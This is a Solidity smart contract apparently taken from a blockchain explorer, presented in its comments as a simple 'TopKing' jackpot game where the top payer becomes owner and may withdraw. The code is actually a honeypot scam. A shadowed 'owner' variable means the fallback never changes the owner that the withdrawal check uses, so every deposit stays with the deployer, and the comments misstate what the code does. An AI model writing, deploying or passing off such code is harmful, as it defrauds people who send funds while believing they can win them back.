
//Address: 0x07f06a75ddf49de735d51dbf5c0a9062c034e7c6
//Contract name: TopKing
//Balance: 0 Ether
//Verification Date: 1/4/2018
//Transacion Count: 3

// CODE STARTS HERE

pragma solidity ^0.4.11;

// Simple Game. Each time you send more than the current jackpot, you become
// owner of the contract. As an owner, you can take the jackpot after a delay
// of 5 days after the last payment.

contract Owned {
    address owner;

    function Owned() public {
        owner = msg.sender;
    }
    modifier onlyOwner{
        if (msg.sender != owner)
            revert();
            _;
    }
}

contract TopKing is Owned {
    address public owner;
    uint public jackpot;
    uint public withdrawDelay;

    function() public payable {
        // transfer contract ownership if player pay more than current jackpot
        if (msg.value > jackpot) {
            owner = msg.sender;
            withdrawDelay = block.timestamp + 5 days;
        }
        jackpot+=msg.value;
    }

    function takeAll() public onlyOwner {
        require(block.timestamp >= withdrawDelay);
        msg.sender.transfer(this.balance);
        jackpot=0;
    }
}
